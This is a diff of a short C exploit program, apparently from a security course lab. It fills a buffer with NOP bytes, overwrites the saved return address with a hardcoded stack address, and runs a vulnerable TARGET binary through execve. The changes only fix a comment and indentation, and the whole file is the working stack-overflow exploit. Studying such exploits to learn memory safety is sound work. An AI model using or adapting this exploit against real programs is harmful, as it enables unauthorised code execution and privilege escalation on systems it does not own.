@@ -9,9 +9,9 @@
 
 int main(void)
 {
-	// 256 bytes is the buffer, 2*sizeof(int) for two params, and 1 byte for
+	// 256 bytes is the buffer, 2*sizeof(int) for ebp and eip, and 1 byte for
 	// null terminator.
-	char sploitstring[256 + 2*sizeof(int) + 1];
+	char sploitstring[256 + 2 * sizeof(int) + 1];
 	// Set all NOP.
 	memset(sploitstring, '\x90', sizeof(sploitstring));
 	// Set final null.
@@ -22,11 +22,11 @@ int main(void)
 	int* ret = (int*)(sploitstring + 256 + sizeof(int));
 	*ret = 0xbffffc5c;
 
-  char *args[] = { TARGET, sploitstring, NULL };
-  char *env[] = { NULL };
+	char *args[] = { TARGET, sploitstring, NULL };
+	char *env[] = { NULL };
 
-  execve(TARGET, args, env);
-  fprintf(stderr, "execve failed.\n");
+	execve(TARGET, args, env);
+	fprintf(stderr, "execve failed.\n");
 
-  return 0;
+	return 0;
 }
